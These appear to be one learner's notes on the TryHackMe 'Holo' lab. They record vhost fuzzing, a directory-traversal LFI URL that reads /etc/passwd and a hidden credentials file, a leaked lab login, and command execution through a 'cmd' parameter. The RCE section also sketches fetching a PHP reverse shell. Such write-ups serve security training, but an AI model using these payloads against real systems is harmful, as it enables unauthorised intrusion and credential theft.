![[Pasted image 20250405024924.png]]
- `robots.txt`
	- ![[Pasted image 20250405025235.png]]
- Add `holo.live` in `/etc/hosts` file to access these
- **All are forbidden :(**
- ![[Pasted image 20250405032830.png]]
- ![[Pasted image 20250405032840.png]]

# Vhosts enumeration:
---
- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://holo.live -H "Host: FUZZ.holo.live" -fw 1288`
	- ![[Pasted image 20250405032934.png]]
- ==Add `www.holo.live admin.holo.live` dev.holo.live` to /etc/hosts as well==


# admin.holo.live
---
![[Pasted image 20250405043717.png]]
- robots.txt:
	- ![[Pasted image 20250405041914.png]]
- These give `403` forbidden

# dev.holo.live
---

![[Pasted image 20250405043726.png]]
- **gobuster scan reveals:**
- ![[Pasted image 20250405043640.png]]

# LFI
---
- Note: this was covered in **THM walkthrough**, there is no way I can find LFI on my own from this alone
- `http://dev.holo.live/img.php?file=../../../../etc/passwd`
	- ![[Pasted image 20250405043936.png]]
- Let's get `supersecretcredentials` from `admin` domain
- `http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt`
	- ![[Pasted image 20250405044052.png]]
	- **Credentials : `admin:DBManagerLogin!`**
	- Some user: `gurag`

# Login as `admin` on `admin.holo.live`
---
![[Pasted image 20250405044226.png]]
- Page source gives `possible RCE`:
	- ![[Pasted image 20250405044511.png]]

# RCE on admin portal
---
- `http://admin.holo.live/dashboard.php?cmd=whoami`
	- ![[Pasted image 20250405044539.png]]
- Get a shell (pentestmonkey php shell)
	- Host `shell.php` using `python3`
	- Download using `curl` using `burpsuite`
	- ![[Pasted image 20250405045725.png]]
	- ![[Pasted image 20250405045823.png]]
	- Maybe inside a docker :
	- ![[Pasted image 20250405050023.png]]